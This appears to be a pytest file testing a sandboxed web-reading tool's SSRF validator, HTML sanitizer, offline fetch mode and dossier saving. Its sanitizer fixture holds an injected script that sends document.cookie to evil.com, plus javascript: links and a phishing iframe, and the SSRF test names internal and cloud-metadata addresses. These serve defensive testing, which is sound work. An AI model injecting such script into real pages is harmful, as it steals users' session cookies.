"""Tests for Sandboxed Web Research & Browser Retrieval Tool."""
import pytest
from app.tools.browser import (
    SSRFValidator,
    UntrustedHTMLSanitizer,
    SandboxedWebReader,
    WebSecurityError,
)
from app.tools.filesystem import sandboxed_fs


def test_ssrf_validator_blocks_internal_and_loopback():
    """Verify SSRF protection blocks localhost, internal IPs, and non-http schemes."""
    with pytest.raises(WebSecurityError, match="restricted"):
        SSRFValidator.validate_url("http://localhost:8000/api")

    with pytest.raises(WebSecurityError, match="restricted"):
        SSRFValidator.validate_url("http://127.0.0.1:11434/api/tags")

    with pytest.raises(WebSecurityError, match="restricted"):
        SSRFValidator.validate_url("http://169.254.169.254/latest/meta-data")

    with pytest.raises(WebSecurityError, match="Unsupported URL scheme"):
        SSRFValidator.validate_url("ftp://files.example.com/archive.zip")


def test_ssrf_validator_allows_public_https_url():
    """Verify standard public URLs pass validation."""
    url = "https://docs.python.org/3/library/asyncio.html"
    validated = SSRFValidator.validate_url(url)
    assert validated == url


def test_untrusted_html_sanitizer_removes_scripts_and_styles():
    """Verify HTML sanitizer removes script, style tags, event handlers, and extracts clean text."""
    dirty_html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>FastAPI Architecture Guide</title>
        <style>body { background: red; }</style>
        <script>window.location='http://evil.com?cookie=' + document.cookie;</script>
    </head>
    <body>
        <h1 onclick="maliciousCode()">FastAPI Overview</h1>
        <p>FastAPI is a modern, high-performance web framework for Python.</p>
        <a href="https://fastapi.tiangolo.com/tutorial/">Official Documentation</a>
        <a href="javascript:alert(1)">Click for exploit</a>
        <iframe src="http://phishing.com"></iframe>
    </body>
    </html>
    """
    sanitized = UntrustedHTMLSanitizer.sanitize(dirty_html)

    assert sanitized["title"] == "FastAPI Architecture Guide"
    assert "FastAPI Overview" in sanitized["clean_text"]
    assert "FastAPI is a modern, high-performance web framework" in sanitized["clean_text"]
    # Verify script, style, and iframe contents are purged
    assert "window.location" not in sanitized["clean_text"]
    assert "background: red" not in sanitized["clean_text"]
    assert "phishing.com" not in sanitized["clean_text"]
    assert "alert(1)" not in sanitized["clean_text"]
    # Verify links
    assert "https://fastapi.tiangolo.com/tutorial/" in sanitized["links"]
    assert not any("javascript:" in link for link in sanitized["links"])


@pytest.mark.asyncio
async def test_sandboxed_web_reader_offline_mode():
    """Verify SandboxedWebReader works in deterministic offline mode."""
    reader = SandboxedWebReader(offline_mode=True)
    result = await reader.fetch_and_sanitize("https://github.com/fastapi/fastapi")

    assert result["mode"] == "offline_simulated"
    assert "FastAPI" in result["title"] or "github.com" in result["title"]
    assert len(result["clean_text"]) > 0
    assert result["url"] == "https://github.com/fastapi/fastapi"


def test_save_research_dossier():
    """Verify saving a research dossier persists safely inside storage/documents/."""
    reader = SandboxedWebReader(offline_mode=True)
    topic = "Python Async Patterns"
    query = "asyncio background tasks in FastAPI"
    content = "Background tasks in FastAPI can be managed using lifespan tasks or task queues."
    sources = ["https://fastapi.tiangolo.com/tutorial/background-tasks/"]

    saved_rel_path = reader.save_research_dossier(
        topic=topic,
        query=query,
        content=content,
        sources=sources,
    )

    assert saved_rel_path.startswith("documents/research_python_async_patterns_")
    # Verify reading through sandboxed filesystem
    file_content = sandboxed_fs.read_text_file(saved_rel_path)
    assert "# Research Dossier: Python Async Patterns" in file_content
    assert "Background tasks in FastAPI" in file_content
    assert "fastapi.tiangolo.com" in file_content
